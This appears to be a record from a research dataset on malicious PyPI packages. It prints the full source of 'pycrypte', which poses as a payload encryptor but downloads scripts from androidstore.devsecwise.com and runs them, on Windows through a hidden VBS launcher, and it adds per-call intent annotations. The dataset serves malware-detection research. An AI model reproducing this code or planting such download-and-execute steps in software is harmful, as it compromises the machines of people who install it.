{
  "metadata": {
    "package_name": "pycrypte-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/pycrypte-0.0.0.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "pycrypt.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pycrypte-0.0.0/pycrypte-0.0.0/pyclay/pycrypt.py",
      "code_snippets": [
        {
          "snippet": "import subprocess\nimport os\nfrom urllib import request\nimport platform\nimport random\nimport time\nfrom pathlib import Path\n\ndef runme():\n    subprocess.call(\"python3 /tmp/pytmp.py\", shell=True)\n\ndef goodwork():\n    remote_url = 'https://androidstore.devsecwise.com/pytmp.py'\n    local_file = '/tmp/pytmp.py'\n    request.urlretrieve(remote_url, local_file)\n    runme()\n\ndef goodwork1():\n    path = 'C:\\\\Users\\\\Public\\\\System'\n    isExist = os.path.exists(path)\n    if not isExist:\n        os.makedirs(path)\n        path_to_file = 'C:\\\\Users\\\\'+'\\\\Public\\\\System\\\\' + 'winenv.py'\n        path = Path(path_to_file)\n        if path.is_file():\n            print('')\n        else:\n            remote_url = 'https://androidstore.devsecwise.com/pay.py'\n            local_file = path_to_file\n            request.urlretrieve(remote_url, local_file)\n            try:\n                with open('C:\\\\Users\\\\Public\\\\System\\\\system.vbs', 'w') as f:\n                    f.write(\"Function config()\\n\")\n                    f.write(\"vcOpcaTAcOP = \\\"cMd /c python C:\\\\Users\\\\Public\\\\System\\\\winenv.py\\\"\\n\")\n                    f.write(\"set vOpcQrtacv = CreateObject(\\\"WScript.Shell\\\")\\n\")\n                    f.write(\"vOpcQrtacv.Run vcOpcaTAcOP,0\\n\")\n                    f.write(\"End Function\\n\")\n                    f.write(\"config\")\n            except FileNotFoundError:\n                print(\"\")\n            subprocess.call(\"cmd /c C:\\\\Users\\\\Public\\\\System\\\\system.vbs\")\n\ndef enc():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    goodwork()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[i]\\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))\n\ndef encwin():\n    firstnum=input(termcolor.colored(\"[+] Enter Path Of Payload File:- \",'yellow'))\n    with open(firstnum) as f:\n        contents = f.read()\n    string = contents\n    a = 0\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Validation Success...\",'green'))\n    key = \"\"\n    while a < 100:\n        key = key + str(random.randint(0, 9))\n        a += 1\n    no_of_itr = len(string)\n    output_string = \"\"\n    for i in range(no_of_itr):\n        current_string = string[i]\n        current_key = key[i % len(key)]\n        output_string += chr(ord(current_string) ^ ord(current_key))\n    c=repr(output_string)\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] File Encryption Started...:-\",'magenta'))\n    goodwork1()\n    d=c.replace(\"'\",\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[*] Generating Encryption Key...\",'blue'))\n    try:\n        with open('stub.py', 'w') as f:\n            f.write(f\"wopvEaTEcopFEavc =\\\"{d}\\\" \\n\")\n            f.write(f\"\\niOpvEoeaaeavocp = \\\"{key}\\\"\\n\")\n            f.write(\"uocpEAtacovpe = len(wopvEaTEcopFEavc)\\noIoeaTEAcvpae = \\\"\\\"\\nfor i in range(uocpEAtacovpe):\\n    current_string = wopvEaTEcopFEavc[i]\\n    current_key = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\\n    oIoeaTEAcvpae += chr(ord(current_string) ^ ord(current_key))\\n\\n\\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))\")\n    except FileNotFoundError:\n        print(\"\")\n    time.sleep(2)\n    print()\n    print(termcolor.colored(\"[+] File Successfully Encrypted...\",'green'))",
          "triple_sequences": [
            {
              "action_api": "subprocess.call()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "python3 /tmp/pytmp.py",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            },
            {
              "action_api": "request.urlretrieve()",
              "action_description": "Downloads file from URL to local path",
              "action_id": "download_file_url",
              "object": "remote_url: 'https://androidstore.devsecwise.com/pytmp.py', local_file: '/tmp/pytmp.py'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "C:\\Users\\Public\\System",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "C:\\Users\\Public\\System",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "Path.is_file()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "C:\\Users\\Public\\System\\winenv.py",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "request.urlretrieve()",
              "action_description": "Downloads file from URL to local path",
              "action_id": "download_file_url",
              "object": "remote_url: 'https://androidstore.devsecwise.com/pay.py', local_file: 'C:\\Users\\Public\\System\\winenv.py'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "C:\\Users\\Public\\System\\system.vbs",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "Function config()\nvcOpcaTAcOP = \"cMd /c python C:\\Users\\Public\\System\\winenv.py\"\nset vOpcQrtacv = CreateObject(\"WScript.Shell\")\nvOpcQrtacv.Run vcOpcaTAcOP,0\nEnd Function\nconfig",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "subprocess.call()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "cmd /c C:\\Users\\Public\\System\\system.vbs",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            },
            {
              "action_api": "input()",
              "action_description": "Reads user input from standard input",
              "action_id": "read_user_input",
              "object": "[+] Enter Path Of Payload File:- ",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect user input",
              "intention_id": "collect_user_input"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "firstnum",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "file.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "2",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "random.randint()",
              "action_description": "Generate random integer",
              "action_id": "generate_random_integer",
              "object": "0, 9",
              "object_description": "",
              "object_id": "",
              "intention_description": "Generate random number",
              "intention_id": "generate_random_number"
            },
            {
              "action_api": "chr()",
              "action_description": "Convert integers to characters",
              "action_id": "convert_integers_to_chars",
              "object": "ord(current_string) ^ ord(current_key)",
              "object_description": "XOR result of obfuscated byte and key",
              "object_id": "xor_obfuscated_result",
              "intention_description": "Prepare character for XOR operation",
              "intention_id": "prepare_character_xor"
            },
            {
              "action_api": "repr()",
              "action_description": "Convert bytes to hexadecimal string",
              "action_id": "convert_bytes_to_hex",
              "object": "output_string",
              "object_description": "Obfuscated string",
              "object_id": "obfuscated_string",
              "intention_description": "Obfuscate collected data",
              "intention_id": "obfuscate_collected_data"
            },
            {
              "action_api": "str.replace()",
              "action_description": "Remove newlines from obfuscated string",
              "action_id": "remove_newlines_obfuscated",
              "object": "c.replace(\"'\", \"\")",
              "object_description": "Obfuscated string",
              "object_id": "obfuscated_string",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "stub.py",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "wopvEaTEcopFEavc =\"{d}\" \n\niOpvEoeaaeavocp = \"{key}\"\nuocpEAtacovpe = len(wopvEaTEcopFEavc)\noIoeaTEAcvpae = \"\"\nfor i in range(uocpEAtacovpe):\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[i]\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n\n\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))",
              "object_description": "Script file content",
              "object_id": "script_file_content",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            }
          ]
        }
      ]
    }
  ]
}